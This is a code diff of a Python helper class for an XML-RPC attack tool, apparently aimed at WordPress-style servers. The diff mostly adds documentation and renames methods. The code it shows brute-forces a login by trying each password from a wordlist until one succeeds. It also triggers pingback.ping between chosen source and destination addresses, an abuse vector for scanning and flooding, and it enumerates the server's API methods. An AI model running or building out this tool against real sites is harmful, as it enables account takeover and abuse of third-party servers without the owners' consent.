@@ -6,20 +6,45 @@ from XmlRpcRequest import XmlRpcRequest
 
 
 class XmlRpcHelper(object):
+    """
+        This class helps represents as manager class to use XmlRpcRequest class.
+
+        Attributes
+        ----------
+        args : Namespace
+            The simple Argparse library object to storing attributes.
+
+        Methods
+        -------
+        _launchGetApiMethods(self) -> AnyStr
+            This method returns list of available API methods of target server.
+        _launchPingMode(self, src: str, dst: str) -> AnyStr
+            This method start pinging by specified source and destination
+            target addresses.
+        _readWordlist(file_path: str) -> List[str]
+            This method returns List of passwords to brute-forcing.
+        _launchBruteMode(self, login: str, file_path: str) -> AnyStr
+            This method start brute-forcing by specified login and passwords
+            wordlist.
+        selectScriptMode(self) -> None
+            This mode configures and invokes XmlRpcRequest.sendHttpRequest method
+            by specified method from command line by user.
+    """
 
     def __init__(self, args: Namespace):
         self.args = args
 
+        # TODO: add module with args validation
         self.url = args.u
         self.method = args.m
 
         self.xmlRpcRequest = XmlRpcRequest(url=self.url, method=self.method)
 
     def _launchGetApiMethods(self) -> AnyStr:
-        return self.xmlRpcRequest.sendRequest()
+        return self.xmlRpcRequest.sendHttpRequest()
 
     def _launchPingMode(self, src: str, dst: str) -> AnyStr:
-        return self.xmlRpcRequest.sendRequest(first_param=src, second_param=dst)
+        return self.xmlRpcRequest.sendHttpRequest(first_param=src, second_param=dst)
 
     @staticmethod
     def _readWordlist(file_path: str) -> List[str]:
@@ -33,8 +58,8 @@ class XmlRpcHelper(object):
         passwords = XmlRpcHelper._readWordlist(file_path=file_path)
 
         for passwd in passwords:
-            response = self.xmlRpcRequest.sendRequest(first_param=login, second_param=passwd)
-            validation_response = self.xmlRpcRequest.isInvalidCreds(response)
+            response = self.xmlRpcRequest.sendHttpRequest(first_param=login, second_param=passwd)
+            validation_response = self.xmlRpcRequest.credentialsValidation(response)
 
             if validation_response is True:
                 return passwd
@@ -44,7 +69,6 @@ class XmlRpcHelper(object):
         exit(-1)
 
     def selectScriptMode(self) -> None:
-
         if self.method == 'pingback.ping':
             src = self.args.s
             dst = self.args.d
@@ -60,5 +84,5 @@ class XmlRpcHelper(object):
             info(msg=f"[+] Done! The password has been founded: {founded_passwd}")
 
         else:
-            response = self._launchGetApiMethods()
-            info(msg=response)
+            response_text = self._launchGetApiMethods()
+            info(msg=response_text)
